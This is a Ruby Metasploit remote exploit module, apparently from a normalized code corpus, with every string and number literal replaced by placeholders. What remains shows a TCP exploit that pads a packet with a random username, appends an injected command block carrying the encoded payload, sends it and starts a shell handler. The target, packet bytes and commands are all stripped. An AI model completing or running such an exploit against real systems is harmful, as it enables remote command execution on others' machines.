require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > <str> , <str> = > ARCH_CMD , <str> = > { <str> = > <int> , <str> = > true , <str> = > { <str> = > <str> } } , <str> = > [ [ <str> , { } ] ] , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , ] , self . class ) end def exploit user = rand_text_alpha ( <int> ) packet = <str> packet << user * <int> packet << <str> packet << <str> packet << <str> packet << <str> packet << user packet << <str> packet << <str> packet << <str> packet << <str> packet << <str> packet << <str> packet << <str> packet << <str> packet << <str> packet << <str> shell_mio = <str> shell = shell_mio shell << <str> shell << <str> shell << <str> shell << payload . encoded shell << <str> sploit = packet + shell begin print_status ( <str> ) connect sock . put ( sploit ) print_status ( <str> ) handler if ( datastore [ <str> ] ) res = sock . get_once ( - <int> , <int> ) print_status ( res . to_s ) if not res . empty? end rescue print_error ( <str> ) ensure disconnect end end end 
